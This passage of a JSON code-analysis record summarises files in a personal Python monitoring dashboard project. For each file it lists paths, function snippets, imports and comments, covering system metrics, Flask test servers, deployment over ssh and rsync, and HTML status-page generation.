          "def main():\n\"\"\"Set up dashboard authentication.\"\"\"\nbase_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard')\nconfig_path = base_path / 'config/auth.json'\n\nif not config_path.parent.exists():\nconfig_path.parent.mkdir(parents=True)\n\n# Get credentials\nprint(\"Setting up dashboard authentication\")"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import getpass",
          "import hashlib",
          "import base64",
          "import secrets",
          "from pathlib import Path"
        ],
        "comments": [
          "# Get credentials",
          "# Generate salt and hash",
          "# Create or update config"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__simple-server.py",
        "docstrings": [],
        "function_defs": [
          "def do_GET(self):"
        ],
        "class_defs": [
          "class SimpleHandler(BaseHTTPRequestHandler):"
        ],
        "imports": [
          "from http.server import HTTPServer, BaseHTTPRequestHandler"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__socket-test.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import socket",
          "import sys"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 5,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__system-metrics.py",
        "docstrings": [],
        "function_defs": [
          "def get_cpu_metrics(self) -> Dict:\n\"\"\"Get detailed CPU metrics.\"\"\"\ntry:\ncpu_freq = psutil.cpu_freq()\nreturn {\n'percent': psutil.cpu_percent(interval=1),\n'per_cpu': psutil.cpu_percent(interval=1, percpu=True),\n'count': psutil.cpu_count(),\n'count_logical': psutil.cpu_count(logical=True),\n'freq': {",
          "def get_memory_metrics(self) -> Dict:\n\"\"\"Get detailed memory metrics.\"\"\"\ntry:\nvm = psutil.virtual_memory()\nsm = psutil.swap_memory()\nreturn {\n'virtual': {\n'total_gb': round(vm.total / (1024**3), 2),\n'available_gb': round(vm.available / (1024**3), 2),\n'used_gb': round(vm.used / (1024**3), 2),",
          "def get_disk_metrics(self) -> Dict:\n\"\"\"Get detailed disk metrics.\"\"\"\ntry:\npath = '/Volumes/Mac Mini External'\nusage = psutil.disk_usage(path)\nio_counters = psutil.disk_io_counters()\n\nreturn {\n'usage': {\n'total_gb': round(usage.total / (1024**3), 2),",
          "def get_network_metrics(self) -> Dict:\n\"\"\"Get detailed network metrics with improved error handling.\"\"\"\nmetrics = {'interfaces': {}, 'connections': {'total': 0, 'by_status': {}}}\n\n# Get interface metrics first\ntry:\nio_counters = psutil.net_io_counters(pernic=True)\nfor nic, stats in io_counters.items():\n# Skip loopback and inactive interfaces\nif nic in ('lo', 'lo0') or not any([getattr(stats, attr, 0) for attr in ['bytes_sent', 'bytes_recv']]):",
          "def get_process_metrics(self, top_n: int = 10) -> List[Dict]:\n\"\"\"Get detailed process metrics.\"\"\"\ntry:\nprocesses = []\nfor proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'create_time']):\ntry:\npinfo = proc.info\n# Get additional details\nwith proc.oneshot():\npinfo['memory_gb'] = round(proc.memory_info().rss / (1024**3), 3)",
          "def get_all_metrics(self) -> Dict:\n\"\"\"Get all system metrics.\"\"\"\nreturn {\n'timestamp': datetime.now().isoformat(),\n'cpu': self.get_cpu_metrics(),\n'memory': self.get_memory_metrics(),\n'disk': self.get_disk_metrics(),\n'network': self.get_network_metrics(),\n'processes': self.get_process_metrics()\n}"
        ],
        "class_defs": [
          "class SystemMetrics:"
        ],
        "imports": [
          "import os",
          "import psutil",
          "import logging",
          "from typing import Dict, List, Optional",
          "from datetime import datetime",
          "from pathlib import Path",
          "from metrics_cache import cached",
          "from logging_config import log_with_context"
        ],
        "comments": [
          "# Get interface metrics first",
          "# Skip loopback and inactive interfaces",
          "# Log only if debug is enabled",
          "# Only log interface errors at WARNING level",
          "# Get connection metrics",
          "# Handle access denied quietly - normal for non-root users",
          "# Only log unexpected connection errors at WARNING level",
          "# Get additional details",
          "# Sort by CPU percent and return top N"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 3,
        "error_handling": 19,
        "decorators": [
          "@cached(ttl_seconds=5)",
          "@cached(ttl_seconds=5)",
          "@cached(ttl_seconds=30)",
          "@cached(ttl_seconds=5)",
          "@cached(ttl_seconds=5)"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__test-logging.py",
        "docstrings": [],
        "function_defs": [
          "def before_request():",
          "def after_request(response):",
          "def home():",
          "def test():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask",
          "import logging"
        ],
        "comments": [
          "# Set up logging",
          "# Create Flask app",
          "# Add before/after request logging"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@app.before_request",
          "@app.after_request",
          "@app.route('/')",
          "@app.route('/test')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__test-services.py",
        "docstrings": [],
        "function_defs": [
          "def test_configuration():\n\"\"\"Test configuration system.\"\"\"\nlogger.info(\"Testing configuration...\")\n\n# Check directory structure\ndirs_to_check = [\nservice_config.log_dir,\nservice_config.state_dir,\nservice_config.config_dir\n]",
          "def test_service_registry():\n\"\"\"Test service registry functionality.\"\"\"\nlogger.info(\"Testing service registry...\")\n\n# Register test service\nservice_registry.register_service('test_service', TestService)\n\n# Start service\nsuccess = service_registry.start_service('test_service')\nassert success, \"Failed to start test service\"",
          "def test_error_recovery():\n\"\"\"Test error recovery mechanisms.\"\"\"\nlogger.info(\"Testing error recovery...\")\n\n# Start service\nservice_registry.start_service('test_service')\n\n# Wait for error (occurs every 10 iterations)\nlogger.info(\"Waiting for error condition...\")\ntime.sleep(12)  # Ensure we hit an error",
          "def main():\n\"\"\"Run all tests.\"\"\"\ntry:\ntest_configuration()\ntest_service_registry()\ntest_error_recovery()\n\nlogger.info(\"All tests passed!\")\nreturn 0\n"
        ],
        "class_defs": [],
        "imports": [
          "import time",
          "import json",
          "from pathlib import Path",
          "import logging",
          "from src.config.service_config import service_config",
          "from src.services.service_registry import service_registry",
          "from src.services.test_service import TestService"
        ],
        "comments": [
          "# Set up logging",
          "# Check directory structure",
          "# Check config loading",
          "# Register test service",
          "# Start service",
          "# Check status",
          "# Wait for some iterations",
          "# Check state file",
          "# Stop service",
          "# Start service",
          "# Wait for error (occurs every 10 iterations)",
          "# Check recovery",
          "# Stop service"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__test-socket.py",
        "docstrings": [],
        "function_defs": [
          "def hello():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask",
          "from werkzeug.serving import run_simple",
          "import socket",
          "import os"
        ],
        "comments": [
          "# Remove socket if it already exists",
          "# Create Unix domain socket",
          "# Run Flask with Unix socket"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": [
          "@app.route('/')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__test-waitress.py",
        "docstrings": [],
        "function_defs": [
          "def hello():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask",
          "from waitress import serve"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@app.route('/')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__test.py",
        "docstrings": [],
        "function_defs": [
          "def hello():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@app.route('/')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__warp-commander.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, config: dict):",
          "def _generate_core_commands(self) -> List[str]:\n\"\"\"Generate commands for core infrastructure development\"\"\"\nreturn [\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/monitor.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/password_manager.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/docker_manager.py\"\n]\n\ndef _generate_ai_commands(self) -> List[str]:\n\"\"\"Generate commands for AI development\"\"\"",
          "def _generate_ai_commands(self) -> List[str]:\n\"\"\"Generate commands for AI development\"\"\"\nreturn [\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/ai/system_brain.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/ai/model_trainer.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/ai/pattern_analyzer.py\"\n]\n\ndef _generate_automation_commands(self) -> List[str]:\n\"\"\"Generate commands for automation development\"\"\"",
          "def _generate_automation_commands(self) -> List[str]:\n\"\"\"Generate commands for automation development\"\"\"\nreturn [\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/automation/controller.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/automation/task_scheduler.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/automation/safety_monitor.py\"\n]\n\ndef _generate_evolution_commands(self) -> List[str]:\n\"\"\"Generate commands for system evolution\"\"\"",
          "def _generate_evolution_commands(self) -> List[str]:\n\"\"\"Generate commands for system evolution\"\"\"\nreturn [\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/evolution/consciousness.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/evolution/adaptor.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/evolution/optimizer.py\"\n]\n\nasync def execute_commands(self, commands: List[str]):\n\"\"\"Execute commands through Warp\"\"\"",
          "def _log_execution(self, command: str, stdout: bytes, stderr: bytes):\n\"\"\"Log command execution results\"\"\"\ntry:\nself.command_history.append({\n\"timestamp\": datetime.now().isoformat(),\n\"command\": command,\n\"stdout\": stdout.decode() if stdout else \"\",\n\"stderr\": stderr.decode() if stderr else \"\",\n\"phase\": self.current_phase\n})",
          "def _save_history(self):\n\"\"\"Save command execution history\"\"\"\ntry:\nhistory_path = Path(\"/Volumes/Mac Mini External/MemoryCore/logs/command_history.json\")\nhistory_path.parent.mkdir(parents=True, exist_ok=True)\n\nwith open(history_path, 'w') as f:\njson.dump(self.command_history, f, indent=2)\n\nexcept Exception as e:"
        ],
        "class_defs": [
          "class WarpCommander:"
        ],
        "imports": [
          "import asyncio",
          "import logging",
          "import json",
          "from datetime import datetime",
          "from pathlib import Path",
          "from typing import Dict, List"
        ],
        "comments": [
          "# Execute command",
          "# Wait for completion",
          "# Log results",
          "# Save history periodically",
          "# Generate commands for current phase",
          "# Execute commands",
          "# Move to next phase",
          "# Brief pause between phases",
          "# Check completion status",
          "# Run monitoring in parallel with development"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 12,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/app.py",
        "docstrings": [],
        "function_defs": [
          "def generate_metrics():\n\"\"\"Generate current system metrics.\"\"\"\ntry:\nmem = psutil.virtual_memory()\ndisk = psutil.disk_usage('/')\nnet_io = psutil.net_io_counters(pernic=True)\nreturn {\n'cpu_percent': psutil.cpu_percent(interval=1),\n'memory_percent': mem.percent,\n'disk_percent': disk.percent,",
          "def send_metrics():\n\"\"\"SSE event generator.\"\"\"\ntry:\nwhile True:\nmetrics = generate_metrics()\nyield f\"data: {json.dumps(metrics)}\\n\\n\"\nsleep(2)  # Update every 2 seconds\nexcept GeneratorExit:\npass\n",
          "def healthz():\n\"\"\"Health check endpoint.\"\"\"\ntry:\n# Basic system checks\npsutil.cpu_percent()\npsutil.virtual_memory()\npsutil.disk_usage('/')\nreturn jsonify({\n'status': 'healthy',\n'timestamp': datetime.now().isoformat()",
          "def get_system_stats():\n\"\"\"Get comprehensive system statistics.\"\"\"\ntry:\nstats = {\n\"video_processing\": get_video_processing_stats(),\n\"file_mover\": get_file_mover_stats(),\n\"ssh_tunnel\": get_ssh_tunnel_stats(),\n\"events\": get_recent_events()\n}\nreturn jsonify(stats)",
          "def get_video_processing_stats():\n\"\"\"Get video processing statistics.\"\"\"\ntry:\n# Connect to PersonalAssistant SQLite database\ndb_path = Path(\"/Volumes/Mac Mini External/video_enhancer/PersonalAssistant/data.db\")\nif not db_path.exists():\nreturn {\"status\": \"database not found\"}\n\nconn = sqlite3.connect(str(db_path))\ncursor = conn.cursor()",
          "def get_file_mover_stats():\n\"\"\"Get file mover statistics.\"\"\"\ntry:\nbase_path = Path(\"/Volumes/Mac Mini External/MemoryCore\")\n\n# Read hash index\nhash_index = {}\nhash_index_path = base_path / \"hash_index.json\"\nif hash_index_path.exists():\nwith open(hash_index_path) as f:",
          "def get_ssh_tunnel_stats():\n\"\"\"Get SSH tunnel statistics.\"\"\"\ntry:\n# Check tunnel process\nps = subprocess.run(\n[\"ps\", \"aux\"],\ncapture_output=True,\ntext=True\n)\ntunnel_running = \"ssh.*reverse.*tunnel\" in ps.stdout",
          "def get_recent_events():\n\"\"\"Get recent events across all systems.\"\"\"\nevents = []\n\ntry:\n# Check video processing events\ndb_path = Path(\"/Volumes/Mac Mini External/video_enhancer/PersonalAssistant/data.db\")\nif db_path.exists():\nconn = sqlite3.connect(str(db_path))\ncursor = conn.cursor()",
          "def events():\n\"\"\"SSE endpoint for live metrics.\"\"\"\nreturn Response(\nsend_metrics(),\nmimetype='text/event-stream',\nheaders={\n'Cache-Control': 'no-cache',\n'Connection': 'keep-alive',\n'X-Accel-Buffering': 'no'\n}",
          "def format_bytes(bytes):\n\"\"\"Format bytes to human readable string.\"\"\"\nfor unit in ['B', 'KB', 'MB', 'GB', 'TB']:\nif bytes < 1024:\nreturn f\"{bytes:.1f}{unit}\"\nbytes /= 1024\nreturn f\"{bytes:.1f}TB\"\n\n@app.route('/')\ndef index():",
          "def index():\n\"\"\"Dashboard home page.\"\"\"\ntry:\nmem = psutil.virtual_memory()\ndisk = psutil.disk_usage('/')\n\n# Count running processes safely\nrunning_processes = 0\ntry:\nfor proc in psutil.process_iter(['status']):",
          "def status():\n\"\"\"Get rich system status data.\"\"\"\ntry:\n# Get CPU metrics safely\ntry:\ncpu_metrics = psutil.cpu_percent(interval=1, percpu=True)\nexcept Exception:\ncpu_metrics = [0.0]\n\n# Get process metrics safely"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import psutil",
          "import json",
          "import sqlite3",
          "from datetime import datetime, timedelta",
          "from pathlib import Path",
          "from flask import Flask, request, jsonify, render_template, session, redirect, url_for, Response",
          "from flask_cors import CORS",
          "from threading import Lock",
          "from time import sleep",
          "from queue import Queue",
          "import subprocess"
        ],
        "comments": [
          "# Initialize Flask application",
          "# Global state for SSE",
          "# Basic system checks",
          "# Connect to PersonalAssistant SQLite database",
          "# Get processing statistics",
          "# Get active tasks",
          "# Read hash index",
          "# Count conflicts",
          "# Get recent movements from ledger",
          "# Check tunnel process",
          "# Check API endpoint",
          "# Check video processing events",
          "# Check file mover events",
          "# Count running processes safely",
          "# Get network metrics safely",
          "# Get CPU metrics safely",
          "# Get process metrics safely",
          "# Get disk metrics safely",
          "# Get network metrics safely"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 36,
        "decorators": [
          "@app.route('/healthz')",
          "@app.route('/api/stats')",
          "@app.route('/events')",
          "@app.route('/')",
          "@app.route('/api/status')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/deploy.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, base_path: str):",
          "def _load_config(self) -> Dict[str, Any]:\n\"\"\"Load deployment configuration.\"\"\"\nconfig = {\n'production': {\n'host': os.getenv('DEPLOY_HOST', 'localhost'),\n'port': int(os.getenv('DEPLOY_PORT', 8000)),\n'api_key': os.getenv('DEPLOY_KEY'),\n'backup_retention_days': 7\n},\n'staging': {",
          "def create_backup(self, env: str) -> str:\n\"\"\"Create backup of current deployment.\"\"\"\nlogger.info(f\"Creating backup for {env} environment\")\n\ntimestamp = datetime.now().strftime('%Y%m%d_%H%M%S')\nbackup_path = self.backup_dir / f\"backup_{env}_{timestamp}.tar.gz\"\n\ntry:\n# Create backup archive\nsubprocess.run([",
          "def _get_git_commit(self) -> str:\n\"\"\"Get current git commit hash.\"\"\"\ntry:\nresult = subprocess.run(\n['git', 'rev-parse', 'HEAD'],\ncwd=str(self.base_path),\ncapture_output=True,\ntext=True\n)\nreturn result.stdout.strip()",
          "def _get_backup_manifest(self) -> Dict[str, Any]:\n\"\"\"Create manifest of backed up files.\"\"\"\nmanifest = {'files': [], 'total_size': 0}\n\nfor path in ['src', 'static', 'templates']:\ndir_path = self.base_path / path\nif dir_path.exists():\nfor file in dir_path.rglob('*'):\nif file.is_file():\nrel_path = file.relative_to(self.base_path)",
          "def deploy(self, env: str):\n\"\"\"Deploy the dashboard to specified environment.\"\"\"\nlogger.info(f\"Starting deployment to {env}\")\n\ntry:\n# Create backup first\nbackup_path = self.create_backup(env)\n\n# Deploy steps\nself._copy_files(env)",
          "def _copy_files(self, env: str):\n\"\"\"Copy files to deployment location.\"\"\"\nconfig = self.config[env]\n\nif env == 'production':\n# Use rsync for remote deployment\nsubprocess.run([\n'rsync',\n'-av',\n'--delete',",
          "def _update_config(self, env: str):\n\"\"\"Update configuration for environment.\"\"\"\nconfig = self.config[env]\n\nconfig_file = self.base_path / f\"config_{env}.json\"\nif config_file.exists():\nif env == 'production':\nsubprocess.run([\n'scp',\nstr(config_file),",
          "def _run_migrations(self, env: str):\n\"\"\"Run any necessary migrations.\"\"\"\nconfig = self.config[env]\n\nif env == 'production':\nsubprocess.run([\n'ssh',\nconfig['host'],\n'cd /opt/dashboard && python3 src/db/migrate.py'\n], check=True)",
          "def _restart_services(self, env: str):\n\"\"\"Restart application services.\"\"\"\nconfig = self.config[env]\n\nif env == 'production':\nsubprocess.run([\n'ssh',\nconfig['host'],\n'sudo systemctl restart dashboard'\n], check=True)",
          "def _record_deployment(self, env: str, backup_path: str):\n\"\"\"Record deployment details.\"\"\"\nrecord = {\n'timestamp': datetime.now().isoformat(),\n'environment': env,\n'git_commit': self._get_git_commit(),\n'backup_path': backup_path,\n'deployer': os.getenv('USER', 'unknown')\n}\n",
          "def verify(self, env: str) -> bool:\n\"\"\"Verify deployment health.\"\"\"\nconfig = self.config[env]\n\ntry:\n# Check service status\nif env == 'production':\nresult = subprocess.run([\n'ssh',\nconfig['host'],",
          "def rollback(self, env: str):\n\"\"\"Roll back to previous deployment.\"\"\"\nlogger.info(f\"Rolling back {env} deployment\")\n\ntry:\n# Find latest backup\nbackups = sorted(\nself.backup_dir.glob(f\"backup_{env}_*.tar.gz\"),\nkey=lambda x: x.stat().st_mtime,\nreverse=True",
          "def cleanup_old_backups(self, env: str):\n\"\"\"Clean up old backup files.\"\"\"\nconfig = self.config[env]\nretention_days = config['backup_retention_days']\ncutoff_time = time.time() - (retention_days * 86400)\n\nfor backup in self.backup_dir.glob(f\"backup_{env}_*.tar.gz\"):\nif backup.stat().st_mtime < cutoff_time:\nlogger.info(f\"Removing old backup: {backup}\")\nbackup.unlink()",
          "def main():\n\"\"\"Run deployment operations based on command line arguments.\"\"\"\nparser = argparse.ArgumentParser(description='Dashboard deployment tool')\nparser.add_argument(\n'--env',\nchoices=['production', 'staging'],\ndefault='staging',\nhelp='Deployment environment'\n)\nparser.add_argument("
        ],
        "class_defs": [
          "class Deployer:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import subprocess",
          "import argparse",
          "import logging",
          "import json",
          "import time",
          "from pathlib import Path",
          "from datetime import datetime",
          "import requests",
          "from typing import Dict, Any, Optional"
        ],
        "comments": [
          "# Ensure directories exist",
          "# Load environment config",
          "# Create backup archive",
          "# Record backup metadata",
          "# Create backup first",
          "# Deploy steps",
          "# Record deployment",
          "# Use rsync for remote deployment",
          "# Local deployment",
          "# Check service status",
          "# Check API health",
          "# Find latest backup",
          "# Extract backup",
          "# Restart services",
          "# Verify rollback",
          "# Remove metadata file if it exists"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 14,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/dev_controller.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def setup_logging(self):"
        ],
        "class_defs": [
          "class DevelopmentController:"
        ],
        "imports": [
          "import asyncio",
          "import logging",
          "import json",
          "import subprocess",
          "from datetime import datetime, timedelta",
          "from pathlib import Path",
          "from typing import Dict, List"
        ],
        "comments": [
          "# Check cycle time",
          "# Start new cycle",
          "# Run parallel development tracks",
          "# Monitor and adjust",
          "# Save current state",
          "# Reset active tasks",
          "# Plan next cycle",
          "# Check task completion",
          "# Adjust resources based on progress",
          "# Monitor system resources",
          "# Adjust thread allocation",
          "# Balance workload",
          "# Analyze previous cycle",
          "# Adjust priorities",
          "# Update phase targets"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 18,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/flask_test.py",
        "docstrings": [],
        "function_defs": [
          "def test():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask",
          "import logging"
        ],
        "comments": [
          "# Configure logging"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@app.route('/test')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/generate_status.py",
        "docstrings": [],
        "function_defs": [
          "def get_system_status() -> Dict:\n\"\"\"Get comprehensive system status including metrics and state.\"\"\"\ntry:\nmetrics = system_metrics.get_all_metrics()\nstatus = 'healthy'\nissues = []\nif metrics['cpu'].get('percent', 0) > 80:\nissues.append(f\"High CPU usage: {metrics['cpu']['percent']}%\")\nstatus = 'warning'\nif metrics['memory'].get('virtual', {}).get('percent', 0) > 80:",
          "def get_memorycore_stats():\n\"\"\"Get MemoryCore specific statistics.\"\"\"\nbase_path = Path('/Volumes/Mac Mini External/MemoryCore')\nstats = {'total_files': 0, 'total_size': 0, 'categories': {}, 'recent_changes': []}\nfor category in ['docs', 'scripts', 'data', 'models']:\ncat_path = base_path / category\nif cat_path.exists():\nfiles = list(cat_path.rglob('*'))\nfile_count = len([f for f in files if f.is_file()])\ntotal_size = sum((f.stat().st_size for f in files if f.is_file()))",
          "def get_recent_events():\n\"\"\"Get most recent events from timeline data and other sources.\"\"\"\nevents = []\nenriched_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/data/timeline/timeline_enriched.json')\nraw_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/data/timeline/timeline_data.json')\ntimeline_path = enriched_path if enriched_path.exists() else raw_path\nif timeline_path.exists():\ntry:\nwith open(timeline_path) as f:\ndata = json.load(f)",
          "def get_project_narrative():\n\"\"\"Get project narrative data.\"\"\"\nnarrative_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/data/narrative/project_narrative.json')\nif narrative_path.exists():\ntry:\nwith open(narrative_path) as f:\nreturn json.load(f)\nexcept Exception as e:\nlogging.error(f'Error loading narrative: {e}')\nreturn None",
          "def get_system_timeline():\n\"\"\"Get system evolution timeline.\"\"\"\ntimeline_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/data/timeline/system_timeline.json')\nif timeline_path.exists():\ntry:\nwith open(timeline_path) as f:\nreturn json.load(f)\nexcept Exception as e:\nlogging.error(f'Error loading timeline: {e}')\nreturn None",
          "def format_timeline_entry(event):\n\"\"\"Format a timeline entry for display.\"\"\"\ndate = datetime.fromisoformat(event['date'].replace('Z', '+00:00'))\nformatted_date = date.strftime('%Y-%m-%d %H:%M:%S')\ndetails = event.get('details', {})\ndetails_html = ''\nfor key, value in details.items():\nif value and str(value).strip():\ndetails_html += f\"<div class='detail'><span class='key'>{key}:</span> {value}</div>\"\nreturn f\"\\n    <div class='timeline-entry {event['type']}'>\\n        <div class='timeline-date'>{formatted_date}</div>\\n        <div class='timeline-type'>{event['type']}</div>\\n        <div class='timeline-component'>{event['component']}</div>\\n        <div class='timeline-details'>{details_html}</div>\\n    </div>\\n    \"",
          "def format_project_phase(phase):\n\"\"\"Format a project phase for display.\"\"\"\nreturn f\"\\n    <div class='phase-entry'>\\n        <div class='phase-description'>{phase['description']}</div>\\n        <div class='phase-context'>{phase['context']}</div>\\n        <div class='phase-source'>Source: {phase['source_file']}</div>\\n    </div>\\n    \"\n\ndef format_project_status(status):\n\"\"\"Format project status for display.\"\"\"",
          "def format_project_status(status):\n\"\"\"Format project status for display.\"\"\"\nhtml = \"<div class='project-status'>\"\nif 'containers' in status:\nhtml += '<h4>Containers:</h4><ul>'\nfor container, state in status['containers'].items():\nhtml += f\"<li>{container}: <span class='status-{state}'>{state}</span></li>\"\nhtml += '</ul>'\nif 'services' in status:\nhtml += '<h4>Services:</h4><ul>'",
          "def generate_network_section(network_metrics: Dict) -> str:\n\"\"\"Generate HTML for network metrics section with error handling.\"\"\"\ntry:\nhtml_parts = []\nif 'connections' in network_metrics:\nconnections = network_metrics['connections']\nhtml_parts.append(f\"<div>Total Connections: {connections.get('total', 0)}</div>\")\nif 'by_status' in connections:\nstates = [f'{state}: {count}' for state, count in connections['by_status'].items()]\nif states:",
          "def format_project_roadmap(roadmap):\n\"\"\"Format project roadmap for display.\"\"\"\nhtml = \"<div class='project-roadmap'>\"\nfor item in roadmap:\nif item['type'] == 'goals':\nhtml += '<h4>Pending Goals:</h4><ul>'\nfor goal in item['items']:\nhtml += f\"<li class='priority-{item['priority']}'>{goal}</li>\"\nhtml += '</ul>'\nelif item['type'] == 'next_phase':",
          "def generate_timeline_section(timeline_data: Optional[Dict]) -> str:\n\"\"\"Generate the timeline section HTML.\"\"\"\nif not timeline_data:\nreturn ''\nhtml = \"<div class='timeline'>\"\nhtml += \"\\n        <nav class='timeline-nav'>\\n            <div class='timeline-filters'>\\n                <button class='timeline-filter active' data-filter='all'>All</button>\\n                <button class='timeline-filter' data-filter='infrastructure'>Infrastructure</button>\\n                <button class='timeline-filter' data-filter='development'>Development</button>\\n                <button class='timeline-filter' data-filter='integration'>Integration</button>\\n                <button class='timeline-filter' data-filter='automation'>Automation</button>\\n            </div>\\n        </nav>\\n    \"\nif 'summary' in timeline_data and 'statistics' in timeline_data['summary']:\nstats = timeline_data['summary']['statistics']\nhtml += \"\\n            <div class='timeline-stats'>\\n                <h3>Timeline Statistics</h3>\\n                <div class='stats-grid'>\\n        \"\nfor category, count in stats.get('by_category', {}).items():",
          "def generate_html():\n\"\"\"Generate a simple HTML status page with error handling.\"\"\"\ntry:\nmetrics = system_metrics.get_all_metrics()\nevents = get_recent_events()\ntimeline_data = get_system_timeline()\nnarrative_data = get_project_narrative()\nprocessed_timeline = None\nif timeline_data:\ntry:",
          "def generate_error_page(error_message: str) -> str:\n\"\"\"Generate a simple error page.\"\"\"\nreturn f'\\n    <html>\\n    <head>\\n        <title>MemoryCore Status - Error</title>\\n        <style>\\n            body {{ font-family: -apple-system, system-ui, sans-serif; margin: 20px; }}\\n            .error {{ color: #f44336; padding: 20px; background: #ffebee; border-radius: 4px; }}\\n        </style>\\n    </head>\\n    <body>\\n        <h1>MemoryCore Status</h1>\\n        <div class=\"error\">\\n            <h2>Error Generating Status Page</h2>\\n            <p>{error_message}</p>\\n        </div>\\n        <script>\\n            setTimeout(() => window.location.reload(), 30000);\\n        </script>\\n    </body>\\n    </html>\\n    '\n\ndef generate_html_content(metrics: Dict, events: List, timeline_data: Optional[Dict], narrative_data: Optional[Dict]) -> str:\n\"\"\"Generate the main HTML content.\"\"\"",
          "def generate_html_content(metrics: Dict, events: List, timeline_data: Optional[Dict], narrative_data: Optional[Dict]) -> str:\n\"\"\"Generate the main HTML content.\"\"\"\nhtml = ''\ntry:\ntimeline_css = ''\ntry:\ncss_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/src/templates/timeline.css')\nif css_path.exists():\ntimeline_css = css_path.read_text()\nexcept Exception as e:",
          "def main():\n\"\"\"Generate status page and save it.\"\"\"\ntry:\nhtml = generate_html()\noutput_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/index.html')\noutput_path.parent.mkdir(parents=True, exist_ok=True)\nwith open(output_path, 'w') as f:\nf.write(html)\nlogger.info(f'Status page generated successfully at {output_path}')\nexcept Exception as e:"
        ],
        "class_defs": [],
        "imports": [
          "import os",
